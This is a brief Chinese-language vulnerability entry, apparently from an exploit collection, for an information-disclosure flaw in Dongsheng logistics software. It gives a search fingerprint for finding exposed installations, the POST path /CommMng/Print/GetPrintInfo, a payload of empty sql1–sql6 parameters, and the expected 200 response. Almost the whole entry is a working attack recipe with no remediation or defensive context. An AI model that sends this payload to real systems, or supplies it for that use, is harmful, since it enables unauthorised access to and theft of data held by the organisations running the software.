# 东胜物流软件PrintInfo存在信息泄露漏洞

东胜物流软件 ｜ 信息泄露 ｜ —
- **指纹**：`body="FeeCodes/CompanysAdapter.aspx"`
- **请求**：`POST /CommMng/Print/GetPrintInfo HTTP/1.1`

**Payload**
```
type=test&sql1=&sql2=&sql3=&sql4=&sql5=&sql6=
```
- **响应特征**：200